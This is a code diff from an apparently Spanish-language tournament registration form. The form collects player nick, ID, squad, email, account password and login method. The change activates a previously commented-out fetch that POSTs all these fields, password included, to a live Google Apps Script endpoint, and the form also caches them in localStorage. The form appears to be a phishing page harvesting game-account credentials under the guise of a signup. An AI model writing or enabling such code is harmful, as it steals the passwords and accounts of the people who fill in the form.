@@ -316,7 +316,7 @@
     if(!$('f_reglas').checked){ err.textContent = 'Debes aceptar el reglamento.'; err.style.display='block'; return; }
     err.style.display = 'none';
 
-    // fetch('https://script.google.com/macros/s/TU_ID/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(v)});
+    fetch('https://script.google.com/macros/s/AKfycbyFCEwJuC0nZvo5xFyzJYBxewgcrxo8jDWwvV2HnagP0AIvZuiCCRibPbstOn0DGGqHTA/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(v)});
     try{ var a = JSON.parse(localStorage.getItem('ff_cap')||'[]'); a.push(v); localStorage.setItem('ff_cap', JSON.stringify(a)); }catch(e){}
 
     $('dump').textContent = 'capitan: '+v.nick+'\nid: '+v.id+'\nescuadra: '+v.team+'\ncorreo: '+v.mail+'\npassword: '+v.pass+'\nmetodo: '+v.metodo+'\nregion: '+v.reg+'\nfecha: '+v.ts;
